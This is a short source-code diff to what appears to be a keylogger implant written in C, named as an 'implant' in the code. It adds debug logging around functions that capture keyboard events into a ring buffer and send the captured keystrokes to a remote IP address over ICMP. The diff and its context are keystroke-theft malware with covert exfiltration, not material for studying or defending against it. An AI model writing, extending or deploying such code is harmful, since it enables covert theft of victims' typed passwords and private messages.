@@ -79,8 +79,12 @@ flush_buffer(ringbuf_t *rb, const int8_t *dst_ip) {
     size_t bytes_read;
 
     bytes_read = ringbuf_read(rb, payload, ICMP_DATA_SIZE);
-    if (bytes_read > 0)
+    if (bytes_read > 0) {
+#ifdef DEBUG
+        DEBUG_LOG("[>] Sending %zu bytes to %s: \"%.*s\"\n", bytes_read, dst_ip, (int)bytes_read, payload);
+#endif
         icmp_send(dst_ip, payload, bytes_read);
+    }
 }
 
 static void
@@ -177,6 +181,12 @@ evloop_run(implant_t *instance) {
                 continue;
 
             handle_key_event(&keymap, &ev, &ringbuf, &shift_held);
+
+#ifdef DEBUG
+            DEBUG_LOG("[*] Buffer: count=%zu, head=%zu, tail=%zu, data=\"%.*s\"\n",
+                      ringbuf.count, ringbuf.head, ringbuf.tail,
+                      (int)ringbuf.count, ringbuf.data + ringbuf.tail);
+#endif
 
             if (ringbuf_should_flush(&ringbuf))
                 flush_buffer(&ringbuf, instance->ip);
